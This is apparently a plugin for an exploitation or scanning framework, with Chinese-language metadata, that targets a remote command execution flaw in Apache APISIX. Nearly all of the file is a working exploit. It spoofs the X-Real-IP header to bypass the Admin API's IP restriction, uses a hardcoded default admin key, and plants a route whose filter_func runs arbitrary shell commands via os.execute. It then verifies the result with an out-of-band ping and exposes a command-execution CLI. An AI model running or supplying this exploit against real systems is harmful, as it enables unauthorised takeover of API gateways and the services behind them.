# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Apache APISIX Dashboard远程命令执行漏洞",
        "description": "Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            self.exec_cmd(self.target.url, f'ping -nc 1 {subdomain}')
            if execute.verify():
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        self.log.info(f"利用{self.__info__['name']}执行命令无回显")
        self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './apisix/batch-requests'),
            timeout=15,
            headers={'Content-Type': 'application/json'},
            json={
                "headers": {
                    "X-Real-IP": "127.0.0.1",
                    "Content-Type": "application/json"
                },
                "timeout": 1500,
                "pipeline": [
                    {
                        "method": "PUT",
                        "path": "/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
                        "body": f"{{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/test\",\r\n \"upstream\":{{\"type\":\"roundrobin\",\"nodes\":{{\"httpbin.org:80\":1}}}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('{cmd}'); return true end\"}}"
                    }
                ]
            }
        )
        self.request(
            method='GET',
            path="./api/test",
            timeout=15,
            headers={'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1'},
        )
